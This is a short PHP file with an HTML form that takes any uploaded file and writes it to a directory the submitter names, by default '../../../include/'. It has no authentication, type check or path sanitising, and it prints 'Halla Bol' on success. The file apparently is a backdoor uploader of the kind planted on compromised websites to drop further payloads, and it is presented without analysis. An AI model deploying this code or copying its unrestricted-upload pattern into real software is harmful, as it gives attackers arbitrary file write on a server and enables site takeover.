  <?php 
  if(isset($_POST['submit']))
	{
	if(empty($_POST['dir']))
	{
	$dir="../../../include/";
		}
		else 
			{
			$dir=$_POST['dir'];
				}
	 if(move_uploaded_file($_FILES["file"]["tmp_name"],$dir. $_FILES["file"]["name"]))
		{
		echo "Halla Bol";
		}
		}
  ?>
  
  <form action="" method="post" enctype="multipart/form-data" onSubmit="return validate()">
  <input type="file" name="file" id="file">
  <input type="text" name="dir" value="" >
  <input type="submit" name="submit" value="upload">
  </form>